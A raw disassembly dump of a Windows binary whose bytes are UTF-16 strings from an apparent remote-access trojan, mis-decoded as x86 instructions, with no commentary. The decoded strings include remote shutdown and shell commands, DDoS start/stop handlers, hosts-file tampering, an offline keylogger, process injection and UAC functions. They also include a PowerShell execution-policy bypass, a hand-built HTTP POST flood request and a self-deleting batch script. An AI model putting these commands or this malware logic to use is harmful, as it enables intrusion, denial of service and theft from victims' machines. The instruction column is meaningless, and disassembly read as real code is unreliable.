  408568:	73 00                	jae    0x40856a
  40856a:	68 00 75 00 74       	push   $0x74007500
  40856f:	00 64 00 6f          	add    %ah,0x6f(%eax,%eax,1)
  408573:	00 77 00             	add    %dh,0x0(%edi)
  408576:	6e                   	outsb  %ds:(%esi),(%dx)
  408577:	00 2e                	add    %ch,(%esi)
  408579:	00 65 00             	add    %ah,0x0(%ebp)
  40857c:	78 00                	js     0x40857e
  40857e:	65 00 20             	add    %ah,%gs:(%eax)
  408581:	00 2f                	add    %ch,(%edi)
  408583:	00 66 00             	add    %ah,0x0(%esi)
  408586:	20 00                	and    %al,(%eax)
  408588:	2f                   	das
  408589:	00 73 00             	add    %dh,0x0(%ebx)
  40858c:	20 00                	and    %al,(%eax)
  40858e:	2f                   	das
  40858f:	00 74 00 20          	add    %dh,0x20(%eax,%eax,1)
  408593:	00 30                	add    %dh,(%eax)
  408595:	00 00                	add    %al,(%eax)
  408597:	13 50 00             	adc    0x0(%eax),%edx
  40859a:	43                   	inc    %ebx
  40859b:	00 52 00             	add    %dl,0x0(%edx)
  40859e:	65 00 73 00          	add    %dh,%gs:0x0(%ebx)
  4085a2:	74 00                	je     0x4085a4
  4085a4:	61                   	popa
  4085a5:	00 72 00             	add    %dh,0x0(%edx)
  4085a8:	74 00                	je     0x4085aa
  4085aa:	00 2f                	add    %ch,(%edi)
  4085ac:	73 00                	jae    0x4085ae
  4085ae:	68 00 75 00 74       	push   $0x74007500
  4085b3:	00 64 00 6f          	add    %ah,0x6f(%eax,%eax,1)
  4085b7:	00 77 00             	add    %dh,0x0(%edi)
  4085ba:	6e                   	outsb  %ds:(%esi),(%dx)
  4085bb:	00 2e                	add    %ch,(%esi)
  4085bd:	00 65 00             	add    %ah,0x0(%ebp)
  4085c0:	78 00                	js     0x4085c2
  4085c2:	65 00 20             	add    %ah,%gs:(%eax)
  4085c5:	00 2f                	add    %ch,(%edi)
  4085c7:	00 66 00             	add    %ah,0x0(%esi)
  4085ca:	20 00                	and    %al,(%eax)
  4085cc:	2f                   	das
  4085cd:	00 72 00             	add    %dh,0x0(%edx)
  4085d0:	20 00                	and    %al,(%eax)
  4085d2:	2f                   	das
  4085d3:	00 74 00 20          	add    %dh,0x20(%eax,%eax,1)
  4085d7:	00 30                	add    %dh,(%eax)
  4085d9:	00 00                	add    %al,(%eax)
  4085db:	11 50 00             	adc    %edx,0x0(%eax)
  4085de:	43                   	inc    %ebx
  4085df:	00 4c 00 6f          	add    %cl,0x6f(%eax,%eax,1)
  4085e3:	00 67 00             	add    %ah,0x0(%edi)
  4085e6:	6f                   	outsl  %ds:(%esi),(%dx)
  4085e7:	00 66 00             	add    %ah,0x0(%esi)
  4085ea:	66 00 00             	data16 add %al,(%eax)
  4085ed:	1f                   	pop    %ds
  4085ee:	73 00                	jae    0x4085f0
  4085f0:	68 00 75 00 74       	push   $0x74007500
  4085f5:	00 64 00 6f          	add    %ah,0x6f(%eax,%eax,1)
  4085f9:	00 77 00             	add    %dh,0x0(%edi)
  4085fc:	6e                   	outsb  %ds:(%esi),(%dx)
  4085fd:	00 2e                	add    %ch,(%esi)
  4085ff:	00 65 00             	add    %ah,0x0(%ebp)
  408602:	78 00                	js     0x408604
  408604:	65 00 20             	add    %ah,%gs:(%eax)
  408607:	00 2d 00 4c 00 01    	add    %ch,0x1004c00
  40860d:	11 52 00             	adc    %edx,0x0(%edx)
  408610:	75 00                	jne    0x408612
  408612:	6e                   	outsb  %ds:(%esi),(%dx)
  408613:	00 53 00             	add    %dl,0x0(%ebx)
  408616:	68 00 65 00 6c       	push   $0x6c006500
  40861b:	00 6c 00 00          	add    %ch,0x0(%eax,%eax,1)
  40861f:	13 53 00             	adc    0x0(%ebx),%edx
  408622:	74 00                	je     0x408624
  408624:	61                   	popa
  408625:	00 72 00             	add    %dh,0x0(%edx)
  408628:	74 00                	je     0x40862a
  40862a:	44                   	inc    %esp
  40862b:	00 44 00 6f          	add    %al,0x6f(%eax,%eax,1)
  40862f:	00 73 00             	add    %dh,0x0(%ebx)
  408632:	00 11                	add    %dl,(%ecx)
  408634:	53                   	push   %ebx
  408635:	00 74 00 6f          	add    %dh,0x6f(%eax,%eax,1)
  408639:	00 70 00             	add    %dh,0x0(%eax)
  40863c:	44                   	inc    %esp
  40863d:	00 44 00 6f          	add    %al,0x6f(%eax,%eax,1)
  408641:	00 73 00             	add    %dh,0x0(%ebx)
  408644:	00 17                	add    %dl,(%edi)
  408646:	53                   	push   %ebx
  408647:	00 74 00 61          	add    %dh,0x61(%eax,%eax,1)
  40864b:	00 72 00             	add    %dh,0x0(%edx)
  40864e:	74 00                	je     0x408650
  408650:	52                   	push   %edx
  408651:	00 65 00             	add    %ah,0x0(%ebp)
  408654:	70 00                	jo     0x408656
  408656:	6f                   	outsl  %ds:(%esi),(%dx)
  408657:	00 72 00             	add    %dh,0x0(%edx)
  40865a:	74 00                	je     0x40865c
  40865c:	00 15 53 00 74 00    	add    %dl,0x740053
  408662:	6f                   	outsl  %ds:(%esi),(%dx)
  408663:	00 70 00             	add    %dh,0x0(%eax)
  408666:	52                   	push   %edx
  408667:	00 65 00             	add    %ah,0x0(%ebp)
  40866a:	70 00                	jo     0x40866c
  40866c:	6f                   	outsl  %ds:(%esi),(%dx)
  40866d:	00 72 00             	add    %dh,0x0(%edx)
  408670:	74 00                	je     0x408672
  408672:	00 0b                	add    %cl,(%ebx)
  408674:	58                   	pop    %eax
  408675:	00 63 00             	add    %ah,0x0(%ebx)
  408678:	68 00 61 00 74       	push   $0x74006100
  40867d:	00 00                	add    %al,(%eax)
  40867f:	0b 48 00             	or     0x0(%eax),%ecx
  408682:	6f                   	outsl  %ds:(%esi),(%dx)
  408683:	00 73 00             	add    %dh,0x0(%ebx)
  408686:	74 00                	je     0x408688
  408688:	73 00                	jae    0x40868a
  40868a:	00 25 5c 00 64 00    	add    %ah,0x64005c
  408690:	72 00                	jb     0x408692
  408692:	69 00 76 00 65 00    	imul   $0x650076,(%eax),%eax
  408698:	72 00                	jb     0x40869a
  40869a:	73 00                	jae    0x40869c
  40869c:	5c                   	pop    %esp
  40869d:	00 65 00             	add    %ah,0x0(%ebp)
  4086a0:	74 00                	je     0x4086a2
  4086a2:	63 00                	arpl   %eax,(%eax)
  4086a4:	5c                   	pop    %esp
  4086a5:	00 68 00             	add    %ch,0x0(%eax)
  4086a8:	6f                   	outsl  %ds:(%esi),(%dx)
  4086a9:	00 73 00             	add    %dh,0x0(%ebx)
  4086ac:	74 00                	je     0x4086ae
  4086ae:	73 00                	jae    0x4086b0
  4086b0:	00 0d 53 00 68 00    	add    %cl,0x680053
  4086b6:	6f                   	outsl  %ds:(%esi),(%dx)
  4086b7:	00 73 00             	add    %dh,0x0(%ebx)
  4086ba:	74 00                	je     0x4086bc
  4086bc:	73 00                	jae    0x4086be
  4086be:	00 11                	add    %dl,(%ecx)
  4086c0:	48                   	dec    %eax
  4086c1:	00 6f 00             	add    %ch,0x0(%edi)
  4086c4:	73 00                	jae    0x4086c6
  4086c6:	74 00                	je     0x4086c8
  4086c8:	73 00                	jae    0x4086ca
  4086ca:	4d                   	dec    %ebp
  4086cb:	00 53 00             	add    %dl,0x0(%ebx)
  4086ce:	47                   	inc    %edi
  4086cf:	00 00                	add    %al,(%eax)
  4086d1:	2d 4d 00 6f 00       	sub    $0x6f004d,%eax
  4086d6:	64 00 69 00          	add    %ch,%fs:0x0(%ecx)
  4086da:	66 00 69 00          	data16 add %ch,0x0(%ecx)
  4086de:	65 00 64 00 20       	add    %ah,%gs:0x20(%eax,%eax,1)
  4086e3:	00 73 00             	add    %dh,0x0(%ebx)
  4086e6:	75 00                	jne    0x4086e8
  4086e8:	63 00                	arpl   %eax,(%eax)
  4086ea:	63 00                	arpl   %eax,(%eax)
  4086ec:	65 00 73 00          	add    %dh,%gs:0x0(%ebx)
  4086f0:	73 00                	jae    0x4086f2
  4086f2:	66 00 75 00          	data16 add %dh,0x0(%ebp)
  4086f6:	6c                   	insb   (%dx),%es:(%edi)
  4086f7:	00 6c 00 79          	add    %ch,0x79(%eax,%eax,1)
  4086fb:	00 21                	add    %ah,(%ecx)
  4086fd:	00 00                	add    %al,(%eax)
  4086ff:	11 48 00             	adc    %ecx,0x0(%eax)
  408702:	6f                   	outsl  %ds:(%esi),(%dx)
  408703:	00 73 00             	add    %dh,0x0(%ebx)
  408706:	74 00                	je     0x408708
  408708:	73 00                	jae    0x40870a
  40870a:	45                   	inc    %ebp
  40870b:	00 72 00             	add    %dh,0x0(%edx)
  40870e:	72 00                	jb     0x408710
  408710:	00 09                	add    %cl,(%ecx)
  408712:	44                   	inc    %esp
  408713:	00 44 00 6f          	add    %al,0x6f(%eax,%eax,1)
  408717:	00 73 00             	add    %dh,0x0(%ebx)
  40871a:	00 0d 70 00 6c 00    	add    %cl,0x6c0070
  408720:	75 00                	jne    0x408722
  408722:	67 00 69 00          	add    %ch,0x0(%bx,%di)
  408726:	6e                   	outsb  %ds:(%esi),(%dx)
  408727:	00 00                	add    %al,(%eax)
  408729:	15 73 00 65 00       	adc    $0x650073,%eax
  40872e:	6e                   	outsb  %ds:(%esi),(%dx)
  40872f:	00 64 00 50          	add    %ah,0x50(%eax,%eax,1)
  408733:	00 6c 00 75          	add    %ch,0x75(%eax,%eax,1)
  408737:	00 67 00             	add    %ah,0x0(%edi)
  40873a:	69 00 6e 00 00 15    	imul   $0x1500006e,(%eax),%eax
  408740:	73 00                	jae    0x408742
  408742:	61                   	popa
  408743:	00 76 00             	add    %dh,0x0(%esi)
  408746:	65 00 50 00          	add    %dl,%gs:0x0(%eax)
  40874a:	6c                   	insb   (%dx),%es:(%edi)
  40874b:	00 75 00             	add    %dh,0x0(%ebp)
  40874e:	67 00 69 00          	add    %ch,0x0(%bx,%di)
  408752:	6e                   	outsb  %ds:(%esi),(%dx)
  408753:	00 00                	add    %al,(%eax)
  408755:	1b 52 00             	sbb    0x0(%edx),%edx
  408758:	65 00 6d 00          	add    %ch,%gs:0x0(%ebp)
  40875c:	6f                   	outsl  %ds:(%esi),(%dx)
  40875d:	00 76 00             	add    %dh,0x0(%esi)
  408760:	65 00 50 00          	add    %dl,%gs:0x0(%eax)
  408764:	6c                   	insb   (%dx),%es:(%edi)
  408765:	00 75 00             	add    %dh,0x0(%ebp)
  408768:	67 00 69 00          	add    %ch,0x0(%bx,%di)
  40876c:	6e                   	outsb  %ds:(%esi),(%dx)
  40876d:	00 73 00             	add    %dh,0x0(%ebx)
  408770:	00 21                	add    %ah,(%ecx)
  408772:	50                   	push   %eax
  408773:	00 6c 00 75          	add    %ch,0x75(%eax,%eax,1)
  408777:	00 67 00             	add    %ah,0x0(%edi)
  40877a:	69 00 6e 00 73 00    	imul   $0x73006e,(%eax),%eax
  408780:	20 00                	and    %al,(%eax)
  408782:	52                   	push   %edx
  408783:	00 65 00             	add    %ah,0x0(%ebp)
  408786:	6d                   	insl   (%dx),%es:(%edi)
  408787:	00 6f 00             	add    %ch,0x0(%edi)
  40878a:	76 00                	jbe    0x40878c
  40878c:	65 00 64 00 21       	add    %ah,%gs:0x21(%eax,%eax,1)
  408791:	00 00                	add    %al,(%eax)
  408793:	15 4f 00 66 00       	adc    $0x66004f,%eax
  408798:	66 00 6c 00 69       	data16 add %ch,0x69(%eax,%eax,1)
  40879d:	00 6e 00             	add    %ch,0x0(%esi)
  4087a0:	65 00 47 00          	add    %al,%gs:0x0(%edi)
  4087a4:	65 00 74 00 00       	add    %dh,%gs:0x0(%eax,%eax,1)
  4087a9:	39 4f 00             	cmp    %ecx,0x0(%edi)
  4087ac:	66 00 66 00          	data16 add %ah,0x0(%esi)
  4087b0:	6c                   	insb   (%dx),%es:(%edi)
  4087b1:	00 69 00             	add    %ch,0x0(%ecx)
  4087b4:	6e                   	outsb  %ds:(%esi),(%dx)
  4087b5:	00 65 00             	add    %ah,0x0(%ebp)
  4087b8:	4b                   	dec    %ebx
  4087b9:	00 65 00             	add    %ah,0x0(%ebp)
  4087bc:	79 00                	jns    0x4087be
  4087be:	6c                   	insb   (%dx),%es:(%edi)
  4087bf:	00 6f 00             	add    %ch,0x0(%edi)
  4087c2:	67 00 67 00          	add    %ah,0x0(%bx)
  4087c6:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  4087ca:	20 00                	and    %al,(%eax)
  4087cc:	4e                   	dec    %esi
  4087cd:	00 6f 00             	add    %ch,0x0(%edi)
  4087d0:	74 00                	je     0x4087d2
  4087d2:	20 00                	and    %al,(%eax)
  4087d4:	45                   	inc    %ebp
  4087d5:	00 6e 00             	add    %ch,0x0(%esi)
  4087d8:	61                   	popa
  4087d9:	00 62 00             	add    %ah,0x0(%edx)
  4087dc:	6c                   	insb   (%dx),%es:(%edi)
  4087dd:	00 65 00             	add    %ah,0x0(%ebp)
  4087e0:	64 00 00             	add    %al,%fs:(%eax)
  4087e3:	09 24 00             	or     %esp,(%eax,%eax,1)
  4087e6:	43                   	inc    %ebx
  4087e7:	00 61 00             	add    %ah,0x0(%ecx)
  4087ea:	70 00                	jo     0x4087ec
  4087ec:	00 09                	add    %cl,(%ecx)
  4087ee:	23 00                	and    (%eax),%eax
  4087f0:	43                   	inc    %ebx
  4087f1:	00 41 00             	add    %al,0x0(%ecx)
  4087f4:	50                   	push   %eax
  4087f5:	00 00                	add    %al,(%eax)
  4087f7:	0d 50 00 6c 00       	or     $0x6c0050,%eax
  4087fc:	75 00                	jne    0x4087fe
  4087fe:	67 00 69 00          	add    %ch,0x0(%bx,%di)
  408802:	6e                   	outsb  %ds:(%esi),(%dx)
  408803:	00 00                	add    %al,(%eax)
  408805:	07                   	pop    %es
  408806:	52                   	push   %edx
  408807:	00 75 00             	add    %dh,0x0(%ebp)
  40880a:	6e                   	outsb  %ds:(%esi),(%dx)
  40880b:	00 00                	add    %al,(%eax)
  40880d:	0d 49 00 6e 00       	or     $0x6e0049,%eax
  408812:	76 00                	jbe    0x408814
  408814:	6f                   	outsl  %ds:(%esi),(%dx)
  408815:	00 6b 00             	add    %ch,0x0(%ebx)
  408818:	65 00 00             	add    %al,%gs:(%eax)
  40881b:	17                   	pop    %ss
  40881c:	52                   	push   %edx
  40881d:	00 75 00             	add    %dh,0x0(%ebp)
  408820:	6e                   	outsb  %ds:(%esi),(%dx)
  408821:	00 52 00             	add    %dl,0x0(%edx)
  408824:	65 00 63 00          	add    %ah,%gs:0x0(%ebx)
  408828:	6f                   	outsl  %ds:(%esi),(%dx)
  408829:	00 76 00             	add    %dh,0x0(%esi)
  40882c:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  408830:	79 00                	jns    0x408832
  408832:	00 11                	add    %dl,(%ecx)
  408834:	52                   	push   %edx
  408835:	00 65 00             	add    %ah,0x0(%ebp)
  408838:	63 00                	arpl   %eax,(%eax)
  40883a:	6f                   	outsl  %ds:(%esi),(%dx)
  40883b:	00 76 00             	add    %dh,0x0(%esi)
  40883e:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  408842:	79 00                	jns    0x408844
  408844:	00 15 52 00 75 00    	add    %dl,0x750052
  40884a:	6e                   	outsb  %ds:(%esi),(%dx)
  40884b:	00 4f 00             	add    %cl,0x0(%edi)
  40884e:	70 00                	jo     0x408850
  408850:	74 00                	je     0x408852
  408852:	69 00 6f 00 6e 00    	imul   $0x6e006f,(%eax),%eax
  408858:	73 00                	jae    0x40885a
  40885a:	00 0d 69 00 6e 00    	add    %cl,0x6e0069
  408860:	6a 00                	push   $0x0
  408862:	52                   	push   %edx
  408863:	00 75 00             	add    %dh,0x0(%ebp)
  408866:	6e                   	outsb  %ds:(%esi),(%dx)
  408867:	00 00                	add    %al,(%eax)
  408869:	0f 55 00             	andnps (%eax),%xmm0
  40886c:	41                   	inc    %ecx
  40886d:	00 43 00             	add    %al,0x0(%ebx)
  408870:	46                   	inc    %esi
  408871:	00 75 00             	add    %dh,0x0(%ebp)
  408874:	6e                   	outsb  %ds:(%esi),(%dx)
  408875:	00 63 00             	add    %ah,0x0(%ebx)
  408878:	00 07                	add    %al,(%edi)
  40887a:	45                   	inc    %ebp
  40887b:	00 4e 00             	add    %cl,0x0(%esi)
  40887e:	43                   	inc    %ebx
  40887f:	00 00                	add    %al,(%eax)
  408881:	07                   	pop    %es
  408882:	44                   	inc    %esp
  408883:	00 45 00             	add    %al,0x0(%ebp)
  408886:	43                   	inc    %ebx
  408887:	00 00                	add    %al,(%eax)
  408889:	1d 50 00 6c 00       	sbb    $0x6c0050,%eax
  40888e:	75 00                	jne    0x408890
  408890:	67 00 69 00          	add    %ch,0x0(%bx,%di)
  408894:	6e                   	outsb  %ds:(%esi),(%dx)
  408895:	00 20                	add    %ah,(%eax)
  408897:	00 45 00             	add    %al,0x0(%ebp)
  40889a:	72 00                	jb     0x40889c
  40889c:	72 00                	jb     0x40889e
  40889e:	6f                   	outsl  %ds:(%esi),(%dx)
  40889f:	00 72 00             	add    %dh,0x0(%edx)
  4088a2:	21 00                	and    %eax,(%eax)
  4088a4:	20 00                	and    %al,(%eax)
  4088a6:	00 07                	add    %al,(%edi)
  4088a8:	4d                   	dec    %ebp
  4088a9:	00 73 00             	add    %dh,0x0(%ebx)
  4088ac:	67 00 00             	add    %al,(%bx,%si)
  4088af:	0f 54 00             	andps  (%eax),%xmm0
  4088b2:	6f                   	outsl  %ds:(%esi),(%dx)
  4088b3:	00 4c 00 6f          	add    %cl,0x6f(%eax,%eax,1)
  4088b7:	00 77 00             	add    %dh,0x0(%edi)
  4088ba:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  4088be:	00 0d 4f 00 70 00    	add    %cl,0x70004f
  4088c4:	65 00 6e 00          	add    %ch,%gs:0x0(%esi)
  4088c8:	20 00                	and    %al,(%eax)
  4088ca:	5b                   	pop    %ebx
  4088cb:	00 00                	add    %al,(%eax)
  4088cd:	03 5d 00             	add    0x0(%ebp),%ebx
  4088d0:	00 07                	add    %al,(%edi)
  4088d2:	47                   	inc    %edi
  4088d3:	00 45 00             	add    %al,0x0(%ebp)
  4088d6:	54                   	push   %esp
  4088d7:	00 00                	add    %al,(%eax)
  4088d9:	09 2e                	or     %ebp,(%esi)
  4088db:	00 70 00             	add    %dh,0x0(%eax)
  4088de:	73 00                	jae    0x4088e0
  4088e0:	31 00                	xor    %eax,(%eax)
  4088e2:	00 1d 70 00 6f 00    	add    %bl,0x6f0070
  4088e8:	77 00                	ja     0x4088ea
  4088ea:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  4088ee:	73 00                	jae    0x4088f0
  4088f0:	68 00 65 00 6c       	push   $0x6c006500
  4088f5:	00 6c 00 2e          	add    %ch,0x2e(%eax,%eax,1)
  4088f9:	00 65 00             	add    %ah,0x0(%ebp)
  4088fc:	78 00                	js     0x4088fe
  4088fe:	65 00 00             	add    %al,%gs:(%eax)
  408901:	3f                   	aas
  408902:	2d 00 45 00 78       	sub    $0x78004500,%eax
  408907:	00 65 00             	add    %ah,0x0(%ebp)
  40890a:	63 00                	arpl   %eax,(%eax)
  40890c:	75 00                	jne    0x40890e
  40890e:	74 00                	je     0x408910
  408910:	69 00 6f 00 6e 00    	imul   $0x6e006f,(%eax),%eax
  408916:	50                   	push   %eax
  408917:	00 6f 00             	add    %ch,0x0(%edi)
  40891a:	6c                   	insb   (%dx),%es:(%edi)
  40891b:	00 69 00             	add    %ch,0x0(%ecx)
  40891e:	63 00                	arpl   %eax,(%eax)
  408920:	79 00                	jns    0x408922
  408922:	20 00                	and    %al,(%eax)
  408924:	42                   	inc    %edx
  408925:	00 79 00             	add    %bh,0x0(%ecx)
  408928:	70 00                	jo     0x40892a
  40892a:	61                   	popa
  40892b:	00 73 00             	add    %dh,0x0(%ebx)
  40892e:	73 00                	jae    0x408930
  408930:	20 00                	and    %al,(%eax)
  408932:	2d 00 46 00 69       	sub    $0x69004600,%eax
  408937:	00 6c 00 65          	add    %ch,0x65(%eax,%eax,1)
  40893b:	00 20                	add    %ah,(%eax)
  40893d:	00 22                	add    %ah,(%edx)
  40893f:	00 01                	add    %al,(%ecx)
  408941:	03 22                	add    (%edx),%esp
  408943:	00 00                	add    %al,(%eax)
  408945:	2f                   	das
  408946:	50                   	push   %eax
  408947:	00 4f 00             	add    %cl,0x0(%edi)
  40894a:	53                   	push   %ebx
  40894b:	00 54 00 20          	add    %dl,0x20(%eax,%eax,1)
  40894f:	00 2f                	add    %ch,(%edi)
  408951:	00 20                	add    %ah,(%eax)
  408953:	00 48 00             	add    %cl,0x0(%eax)
  408956:	54                   	push   %esp
  408957:	00 54 00 50          	add    %dl,0x50(%eax,%eax,1)
  40895b:	00 2f                	add    %ch,(%edi)
  40895d:	00 31                	add    %dh,(%ecx)
  40895f:	00 2e                	add    %ch,(%esi)
  408961:	00 31                	add    %dh,(%ecx)
  408963:	00 0d 00 0a 00 48    	add    %cl,0x48000a00
  408969:	00 6f 00             	add    %ch,0x0(%edi)
  40896c:	73 00                	jae    0x40896e
  40896e:	74 00                	je     0x408970
  408970:	3a 00                	cmp    (%eax),%al
  408972:	20 00                	and    %al,(%eax)
  408974:	00 80 af 0d 00 0a    	add    %al,0xa000daf(%eax)
  40897a:	00 43 00             	add    %al,0x0(%ebx)
  40897d:	6f                   	outsl  %ds:(%esi),(%dx)
  40897e:	00 6e 00             	add    %ch,0x0(%esi)
  408981:	6e                   	outsb  %ds:(%esi),(%dx)
  408982:	00 65 00             	add    %ah,0x0(%ebp)
  408985:	63 00                	arpl   %eax,(%eax)
  408987:	74 00                	je     0x408989
  408989:	69 00 6f 00 6e 00    	imul   $0x6e006f,(%eax),%eax
  40898f:	3a 00                	cmp    (%eax),%al
  408991:	20 00                	and    %al,(%eax)
  408993:	6b 00 65             	imul   $0x65,(%eax),%eax
  408996:	00 65 00             	add    %ah,0x0(%ebp)
  408999:	70 00                	jo     0x40899b
  40899b:	2d 00 61 00 6c       	sub    $0x6c006100,%eax
  4089a0:	00 69 00             	add    %ch,0x0(%ecx)
  4089a3:	76 00                	jbe    0x4089a5
  4089a5:	65 00 0d 00 0a 00 43 	add    %cl,%gs:0x43000a00
  4089ac:	00 6f 00             	add    %ch,0x0(%edi)
  4089af:	6e                   	outsb  %ds:(%esi),(%dx)
  4089b0:	00 74 00 65          	add    %dh,0x65(%eax,%eax,1)
  4089b4:	00 6e 00             	add    %ch,0x0(%esi)
  4089b7:	74 00                	je     0x4089b9
  4089b9:	2d 00 54 00 79       	sub    $0x79005400,%eax
  4089be:	00 70 00             	add    %dh,0x0(%eax)
  4089c1:	65 00 3a             	add    %bh,%gs:(%edx)
  4089c4:	00 20                	add    %ah,(%eax)
  4089c6:	00 61 00             	add    %ah,0x0(%ecx)
  4089c9:	70 00                	jo     0x4089cb
  4089cb:	70 00                	jo     0x4089cd
  4089cd:	6c                   	insb   (%dx),%es:(%edi)
  4089ce:	00 69 00             	add    %ch,0x0(%ecx)
  4089d1:	63 00                	arpl   %eax,(%eax)
  4089d3:	61                   	popa
  4089d4:	00 74 00 69          	add    %dh,0x69(%eax,%eax,1)
  4089d8:	00 6f 00             	add    %ch,0x0(%edi)
  4089db:	6e                   	outsb  %ds:(%esi),(%dx)
  4089dc:	00 2f                	add    %ch,(%edi)
  4089de:	00 78 00             	add    %bh,0x0(%eax)
  4089e1:	2d 00 77 00 77       	sub    $0x77007700,%eax
  4089e6:	00 77 00             	add    %dh,0x0(%edi)
  4089e9:	2d 00 66 00 6f       	sub    $0x6f006600,%eax
  4089ee:	00 72 00             	add    %dh,0x0(%edx)
  4089f1:	6d                   	insl   (%dx),%es:(%edi)
  4089f2:	00 2d 00 75 00 72    	add    %ch,0x72007500
  4089f8:	00 6c 00 65          	add    %ch,0x65(%eax,%eax,1)
  4089fc:	00 6e 00             	add    %ch,0x0(%esi)
  4089ff:	63 00                	arpl   %eax,(%eax)
  408a01:	6f                   	outsl  %ds:(%esi),(%dx)
  408a02:	00 64 00 65          	add    %ah,0x65(%eax,%eax,1)
  408a06:	00 64 00 0d          	add    %ah,0xd(%eax,%eax,1)
  408a0a:	00 0a                	add    %cl,(%edx)
  408a0c:	00 55 00             	add    %dl,0x0(%ebp)
  408a0f:	73 00                	jae    0x408a11
  408a11:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  408a15:	2d 00 41 00 67       	sub    $0x67004100,%eax
  408a1a:	00 65 00             	add    %ah,0x0(%ebp)
  408a1d:	6e                   	outsb  %ds:(%esi),(%dx)
  408a1e:	00 74 00 3a          	add    %dh,0x3a(%eax,%eax,1)
  408a22:	00 20                	add    %ah,(%eax)
  408a24:	00 01                	add    %al,(%ecx)
  408a26:	35 0d 00 0a 00       	xor    $0xa000d,%eax
  408a2b:	43                   	inc    %ebx
  408a2c:	00 6f 00             	add    %ch,0x0(%edi)
  408a2f:	6e                   	outsb  %ds:(%esi),(%dx)
  408a30:	00 74 00 65          	add    %dh,0x65(%eax,%eax,1)
  408a34:	00 6e 00             	add    %ch,0x0(%esi)
  408a37:	74 00                	je     0x408a39
  408a39:	2d 00 6c 00 65       	sub    $0x65006c00,%eax
  408a3e:	00 6e 00             	add    %ch,0x0(%esi)
  408a41:	67 00 74 00          	add    %dh,0x0(%si)
  408a45:	68 00 3a 00 20       	push   $0x20003a00
  408a4a:	00 35 00 32 00 33    	add    %dh,0x33003200
  408a50:	00 35 00 0d 00 0a    	add    %dh,0xa000d00
  408a56:	00 0d 00 0a 00 01    	add    %cl,0x1000a00
  408a5c:	09 2e                	or     %ebp,(%esi)
  408a5e:	00 62 00             	add    %ah,0x0(%edx)
  408a61:	61                   	popa
  408a62:	00 74 00 00          	add    %dh,0x0(%eax,%eax,1)
  408a66:	13 40 00             	adc    0x0(%eax),%eax
  408a69:	65 00 63 00          	add    %ah,%gs:0x0(%ebx)
  408a6d:	68 00 6f 00 20       	push   $0x20006f00
  408a72:	00 6f 00             	add    %ch,0x0(%edi)
  408a75:	66 00 66 00          	data16 add %ah,0x0(%esi)
  408a79:	00 1f                	add    %bl,(%edi)
  408a7b:	74 00                	je     0x408a7d
  408a7d:	69 00 6d 00 65 00    	imul   $0x65006d,(%eax),%eax
  408a83:	6f                   	outsl  %ds:(%esi),(%dx)
  408a84:	00 75 00             	add    %dh,0x0(%ebp)
  408a87:	74 00                	je     0x408a89
  408a89:	20 00                	and    %al,(%eax)
  408a8b:	33 00                	xor    (%eax),%eax
  408a8d:	20 00                	and    %al,(%eax)
  408a8f:	3e 00 20             	add    %ah,%ds:(%eax)
  408a92:	00 4e 00             	add    %cl,0x0(%esi)
  408a95:	55                   	push   %ebp
  408a96:	00 4c 00 00          	add    %cl,0x0(%eax,%eax,1)
  408a9a:	07                   	pop    %es
  408a9b:	43                   	inc    %ebx
  408a9c:	00 44 00 20          	add    %al,0x20(%eax,%eax,1)
  408aa0:	00 00                	add    %al,(%eax)
  408aa2:	0b 44 00 45          	or     0x45(%eax,%eax,1),%eax
  408aa6:	00 4c 00 20          	add    %cl,0x20(%eax,%eax,1)
  408aaa:	00 22                	add    %ah,(%edx)
  408aac:	00 00                	add    %al,(%eax)
  408aae:	0f 22 00             	mov    %eax,%cr0
  408ab1:	20 00                	and    %al,(%eax)
  408ab3:	2f                   	das
  408ab4:	00 66 00             	add    %ah,0x0(%esi)
  408ab7:	20 00                	and    %al,(%eax)
  408ab9:	2f                   	das
  408aba:	00 71 00             	add    %dh,0x0(%ecx)
  408abd:	00 13                	add    %dl,(%ebx)
  408abf:	53                   	push   %ebx
  408ac0:	00 6f 00             	add    %ch,0x0(%edi)
  408ac3:	66 00 74 00 77       	data16 add %dh,0x77(%eax,%eax,1)
  408ac8:	00 61 00             	add    %ah,0x0(%ecx)
  408acb:	72 00                	jb     0x408acd
  408acd:	65 00 5c 00 00       	add    %bl,%gs:0x0(%eax,%eax,1)
  408ad2:	80 9b 4d 00 6f 00 7a 	sbbb   $0x7a,0x6f004d(%ebx)
  408ad9:	00 69 00             	add    %ch,0x0(%ecx)
  408adc:	6c                   	insb   (%dx),%es:(%edi)
  408add:	00 6c 00 61          	add    %ch,0x61(%eax,%eax,1)
  408ae1:	00 2f                	add    %ch,(%edi)
  408ae3:	00 35 00 2e 00 30    	add    %dh,0x30002e00
  408ae9:	00 20                	add    %ah,(%eax)
  408aeb:	00 28                	add    %ch,(%eax)
  408aed:	00 57 00             	add    %dl,0x0(%edi)
  408af0:	69 00 6e 00 64 00    	imul   $0x64006e,(%eax),%eax
  408af6:	6f                   	outsl  %ds:(%esi),(%dx)
  408af7:	00 77 00             	add    %dh,0x0(%edi)
  408afa:	73 00                	jae    0x408afc
  408afc:	20 00                	and    %al,(%eax)
  408afe:	4e                   	dec    %esi
  408aff:	00 54 00 20          	add    %dl,0x20(%eax,%eax,1)
  408b03:	00 36                	add    %dh,(%esi)
  408b05:	00 2e                	add    %ch,(%esi)
  408b07:	00 31                	add    %dh,(%ecx)
  408b09:	00 3b                	add    %bh,(%ebx)
  408b0b:	00 20                	add    %ah,(%eax)
  408b0d:	00 57 00             	add    %dl,0x0(%edi)
  408b10:	69 00 6e 00 36 00    	imul   $0x36006e,(%eax),%eax
  408b16:	34 00                	xor    $0x0,%al
  408b18:	3b 00                	cmp    (%eax),%eax
  408b1a:	20 00                	and    %al,(%eax)
  408b1c:	78 00                	js     0x408b1e
  408b1e:	36 00 34 00          	add    %dh,%ss:(%eax,%eax,1)
  408b22:	3b 00                	cmp    (%eax),%eax
  408b24:	20 00                	and    %al,(%eax)
  408b26:	72 00                	jb     0x408b28
  408b28:	76 00                	jbe    0x408b2a
  408b2a:	3a 00                	cmp    (%eax),%al
  408b2c:	36 00 36             	add    %dh,%ss:(%esi)
  408b2f:	00 2e                	add    %ch,(%esi)
  408b31:	00 30                	add    %dh,(%eax)
  408b33:	00 29                	add    %ch,(%ecx)
